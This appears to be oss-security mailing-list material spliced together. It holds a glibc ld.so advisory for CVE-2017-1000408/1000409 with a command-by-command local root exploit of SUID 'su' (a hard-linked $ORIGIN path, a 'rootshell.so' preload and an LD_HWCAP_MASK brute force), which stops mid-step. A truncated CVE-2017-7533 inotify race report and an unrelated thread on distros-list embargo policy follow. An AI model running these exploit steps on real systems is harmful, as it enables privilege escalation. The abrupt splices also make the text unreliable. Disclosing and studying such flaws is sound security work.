Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su

Subject: [CVE-2017-7533] kernel: inotify: a race between
 inotify_handle_event() and sys_rename()

Hello,

A race condition was found in Linux kernel present since v3.14-rc1 upto v4.12
including. The race happens between threads of inotify_handle_event() and
vfs_rename() while running the rename operation against the same file. The next
slab data or the slab's free list pointer can be corrupted with attacker-controlled
data as a result of the race.

The researchers of this flaw are Fan Wu and Shixiong Zhao from a research group
supervised by Dr. Heming Cui of the Department of Computer Science, The University
of Hong Kong. Thanks to Rui Gu and Prof. Junfeng Yang from Columbia University for
tools and suggestions.

An upstream patch:

So as for the flaw itself.

There is quite easily reached race condition between inotify_handle_event() and
sys_rename(). A rename thread can change the dentry name before an fsnotify
thread is copying the dentry name but after a memory for this is allocated:

CPU 1                          CPU 2

fsnotify()
  inotify_handle_event(.., file_name)
    strlen(file_name)  // file_name is "foobar"
    alloc_len += len + 1;
    event = kmalloc(alloc_len, GFP_KERNEL); // 7 bytes for the file_name

                               sys_rename()
                                 __d_move() [in fs/dcache.c]
                                   copy_name()
                                   // rename to "foobar_lol_kek_u_pwned"

    strcpy(event->name, file_name);
    // now file_name points to "foobar_lol_kek_u_pwned"
    // but there is a space only for "foobar\0"
    // the next slab or slab's *freelist is corrupted with user controlled data

There is a working exploit allowing privileges escalation in the wild for 32 bit
kernels. We are unaware of such exploit for 64 bit kernels, but these are affected
by this race too and we believe such an exploit could exist.

The result of exploiting the flaw is modified data after the slab, which can be
the next slab data, freelist pointer or something else (if the slab is the last
one in the cache).

The slab corruption caused by the exploit or the reproducer cat be easily seen
with "slub_debug=FZ" kernel parameter. The following log indicates a write beyond
the allocated slab, in this case a write to the slab's red zone:

"Some (most?) of the kernel [security] bugs that get fixed don't go
through" linux-distros as well.

I'm not entirely happy with the wording used there, which currently is:

---
Fixes for sensitive bugs, such as those that might lead to privilege
escalations, may need to be coordinated with the private
<linux-distros@...openwall.org> mailing list so that distribution vendors
are well prepared to issue a fixed kernel upon public disclosure of the
upstream fix. Distros will need some time to test the proposed patch and
will generally request at least a few days of embargo, and vendor update
publication prefers to happen Tuesday through Thursday. When appropriate,
the security team can assist with this coordination, or the reporter can
include linux-distros from the start. In this case, remember to prefix
the email Subject line with "[vs]" as described in the linux-distros wiki:
<<http://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists>>
---

This says that "Distros [...] will generally request at least a few days
of embargo", but the actual policy of (linux-)distros is that the
reporter must provide a tentative public disclosure date/time in their
very first message.

Also, this doesn't say that by disclosing something to (linux-)distros
the reporter accepts the list's policy, and leaves actually reading that
wiki page with the policy optional.

I don't readily have suggested edits, but we should address these issues
somehow.  Please feel free to suggest edits.

On a related note, this might not be representative, but I ran a Twitter
poll on days of week for vulnerability disclosures:

<https://twitter.com/solardiz/status/923885360001757185>

Poll: What days of week work best for you for public disclosure by
others of vulnerabilities in software you (or your employer, etc.) use?

23% No preference or Other
33% Mon
36% Tue, Wed, Thu
 8% Fri, Sat, Sun

As you can see, Mon fared really well - almost same as Tue, Wed, Thu
combined, meaning that it might be _the_ preferred day of week for
vulnerability disclosures.  So we probably shouldn't exclude Mondays.

I'm not sure.  The microarchitectural "bugs" would have been
inappropriate to bring to the distros list earlier than in 14 days prior
to their public disclosures, and I don't know if the public disclosure
dates on those were specific enough to achieve that.  Maybe you know?

Thanks!  Ideally, you'd also demonstrate that Microsoft fixed those
issues (where relevant) within days of their public disclosure (so that
some days of advance notice would have made a difference).  Can you?

Or are you merely pointing out the kind of issues that would have been
relevant to you and presumably fixed promptly now, but were not relevant
and thus were not fixed back then?  That's less than ideal if so.

If Microsoft joins for its Linux offerings (including Linux on top of
Windows), then checking if the Linux issues also affect Windows (itself)
would involve sharing beyond the need-to-know condition of
(linux-)distros list policy, so isn't allowed by default.  It could
still be done with explicit approval of the reporter, though, and I
expect most people would give such approval if asked.
